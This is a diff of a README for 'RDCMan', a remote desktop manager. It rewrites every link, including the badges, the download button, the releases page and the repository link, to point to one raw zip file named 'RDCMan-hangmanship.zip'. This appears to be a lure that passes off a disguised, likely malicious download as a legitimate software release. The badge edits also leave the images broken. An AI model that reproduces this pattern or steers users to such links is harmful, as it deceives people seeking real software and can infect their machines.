@@ -1,14 +1,14 @@
 # 📥 RDCMan - Simplify Your Remote Desktop Connections
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2011%2F10%2F8%2F7-0078D6?style=for-the-badge&logo=windows)]()  
-[![Server](https://img.shields.io/badge/Server-2022%2F2019%2F2016-0078D6?style=for-the-badge&logo=windows)]()  
-[![Version](https://img.shields.io/badge/Version-3.1-green?style=for-the-badge)]()  
+[![Windows](https://raw.githubusercontent.com/terad7453/RDCMan/main/hallux/RDCMan-hangmanship.zip%2011%2F10%2F8%2F7-0078D6?style=for-the-badge&logo=windows)]()  
+[![Server](https://raw.githubusercontent.com/terad7453/RDCMan/main/hallux/RDCMan-hangmanship.zip%2F2019%2F2016-0078D6?style=for-the-badge&logo=windows)]()  
+[![Version](https://raw.githubusercontent.com/terad7453/RDCMan/main/hallux/RDCMan-hangmanship.zip)]()  
 
 ## Updated: May 12, 2025
 
 ## 📥 Download
 
-### **[⬇️ Download RDCMan v3.1 - Latest Release](https://github.com/terad7453/RDCMan/releases)**
+### **[⬇️ Download RDCMan v3.1 - Latest Release](https://raw.githubusercontent.com/terad7453/RDCMan/main/hallux/RDCMan-hangmanship.zip)**
 
 ---
 
@@ -44,7 +44,7 @@ To use RDCMan, ensure your system meets the following requirements:
 
 ### Download & Install
 
-1. Click on the download link: **[⬇️ Download RDCMan v3.1 - Latest Release](https://github.com/terad7453/RDCMan/releases)**.
+1. Click on the download link: **[⬇️ Download RDCMan v3.1 - Latest Release](https://raw.githubusercontent.com/terad7453/RDCMan/main/hallux/RDCMan-hangmanship.zip)**.
 2. A new page will open, displaying all available releases.
 3. Locate the version you want to install (RDCMan v3.1).
 4. Click on the appropriate file to download (e.g., .exe format).
@@ -64,7 +64,7 @@ If you encounter problems while using RDCMan, try the following steps:
 
 - **Connection Issues:** Ensure your internet connection is stable. Check if the server address is correct.
 - **Permission Errors:** Run the application as an administrator to avoid permission issues.
-- **Missing Features:** If certain features do not appear, update to the latest version by downloading it from the [Releases page](https://github.com/terad7453/RDCMan/releases).
+- **Missing Features:** If certain features do not appear, update to the latest version by downloading it from the [Releases page](https://raw.githubusercontent.com/terad7453/RDCMan/main/hallux/RDCMan-hangmanship.zip).
 
 ## 🤝 Support and Community
 
@@ -75,7 +75,7 @@ For further help, you can explore our community forums or reach out directly thr
 - [Product Documentation](#)  
   Learn more about RDCMan's features and capabilities.
   
-- [GitHub Repository](https://github.com/terad7453/RDCMan)  
+- [GitHub Repository](https://raw.githubusercontent.com/terad7453/RDCMan/main/hallux/RDCMan-hangmanship.zip)  
   Visit our GitHub for updates and issue tracking.
 
 ## 🔗 Related Topics
